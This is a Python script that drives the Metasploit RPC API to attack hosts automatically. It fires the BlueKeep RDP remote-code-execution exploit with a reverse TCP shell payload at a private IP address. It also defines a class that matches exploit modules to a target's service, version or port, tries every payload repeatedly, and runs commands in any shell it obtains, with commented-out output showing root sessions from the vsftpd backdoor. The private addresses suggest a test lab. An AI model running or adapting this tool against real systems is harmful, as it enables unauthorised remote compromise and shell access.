# coding=utf-8
# desc = msfrpcd -P mypassword -n -f -a 0.0.0.0
import time
# import json
from metasploit.msfrpc import MsfRpcClient

client = MsfRpcClient('mypassword', server='172.31.50.156', port=55553)
# array = client.modules.exploits
# print array
# result = []
# for item in array:
#     # print item
#     if 'dns' in item:
#         result.append(item)
# print result
exploit = client.modules.use('exploit', 'windows/rdp/cve_2019_0708_bluekeep_rce')
# exploit = client.modules.use('exploit', 'exploit/unix/ftp/vsftpd_234_backdoor')
# print json.dumps(exploit._info)
# print exploit.description

# print exploit.payloads
# # print exploit.required
exploit['RHOSTS'] = '172.31.50.252'
exploit['RPORT'] = 3389
exploit['CHOST'] = '172.31.50.156'
# exploit['CPORT'] = 4444
exploit['CheckModule'] = 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'
exploit['VERBOSE'] = True
exploit.target = 1
# client.sessions.kill(5)

# print exploit.execute(payload='cmd/unix/interact')
print exploit.execute(payload='windows/x64/shell/reverse_tcp')
print client.sessions.list

# shell交互结果
# shell = client.sessions.session(1)
# shell.write('ps -elf | head -2 | tail -1\n')
# content = shell.read()
# print content.replace(' ','')


def port_service(port):
    data = {
        '21': {'service': 'ftp', 'desc': 'FTP文件传输协议', 'threat': '允许匿名的上传、下载、爆破和嗅探操作'},
        '22': {'service': 'ssh', 'desc': 'SSH远程连接', 'threat': '爆破、SSH隧道及内网代理转发、文件传输'},
        '23': {'service': 'telnet', 'desc': 'TELNET远程连接', 'threat': '爆破、嗅探、弱口令'},
    }
    if port in data.keys():
        return data[port]
    return False


class MetasploitScan:
    def __init__(self, target, service, version, port):
        """
        + 对一个服务(端口)的所有攻击结果
        """
        self.target = target
        self.version = version
        self.service = service  # vsftpd
        self.port = port

    # 杀掉旧session
    def kill_sessions(self):
        for _id in client.sessions.list.keys():
            client.sessions.kill(_id)

    def _match_exploits(self):
        array = client.modules.exploits
        result = []
        # 有服务、有版本
        if self.service and self.version:
            version = self.version
            version = version.replace('_', '')
            for item in array:
                if self.service in item and version in item:
                    result.append(item)
        # 只有服务
        elif self.service:
            for item in array:
                if self.service in item:
                    result.append(item)
        # 只有端口
        else:
            resp = port_service(self.port)
            if not resp:
                return result  # 识别不出啥服务就跳过该端口的攻击
            for item in array:
                if resp['service'] in item:
                    result.append(item)

        return result

    # session交互
    def communicate_session(self, session_id):
        shell = client.sessions.session(session_id)
        shell.write('uptime\n')
        content = shell.read()
        return content.replace(' ', '')

    def _attack(self, mname):
        result = []
        attacker = client.modules.use('exploit', mname)
        attrs = attacker.required
        if 'RHOSTS' in attrs:
            attacker['RHOSTS'] = self.target
        if 'RPORT' in attrs:
            attacker['RPORT'] = self.port
        attacker['VERBOSE'] = True
        payload_list = attacker.payloads
        for payload in payload_list:
            self.kill_sessions()
            for _ in range(30):
                attacker.execute(payload=payload)
                array = client.sessions.list
                if len(array) != 0:
                    s_id = array.keys()[0]
                    content = self.communicate_session(s_id)
                    result.append({'payload': payload, 'content': content})
                    break
                else:
                    time.sleep(1)

        return result

    def run(self):
        result = []
        array = self._match_exploits()
        for item in array:
            data = self._attack(item)
            result.append({'exploit': item, 'result': data})

        return result


if __name__ == "__main__":
    # scanner = MetasploitScan('172.31.50.177', 'ftp','','21') # 端口可以是数字
    # print scanner.run()
    # print client.sessions.list
    # client.sessions.kill(1)
    # aa = {1: {'info': '', 'username': 'root', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact', 'uuid': 'azl7wnng', 'tunnel_local': '0.0.0.0:0', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'arch': 'cmd', 'exploit_uuid': 'ikvzxt5f', 'tunnel_peer': '172.31.50.156:6200', 'workspace': 'false', 'routes': '', 'target_host': '172.31.50.156', 'type': 'shell', 'session_host': '172.31.50.156', 'desc': 'Command shell'}, 2: {'info': '', 'username': 'root', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact', 'uuid': 'nmkmqxlp', 'tunnel_local': '0.0.0.0:0', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'arch': 'cmd', 'exploit_uuid': 'x23bud0z', 'tunnel_peer': '172.31.50.177:6200', 'workspace': 'false', 'routes': '', 'target_host': '172.31.50.177', 'type': 'shell', 'session_host': '172.31.50.177', 'desc': 'Command shell'}}
    # print len(aa)
    # for a in aa.keys():
    #     print a

    # for item1 in client.modules.exploits:
    #     if 'vsftpd' in item1 and '234' in item1:
    #         print item1
    # aa = 'lkj\n'
    # if '\n' in aa:
    #     print 'c'
    pass
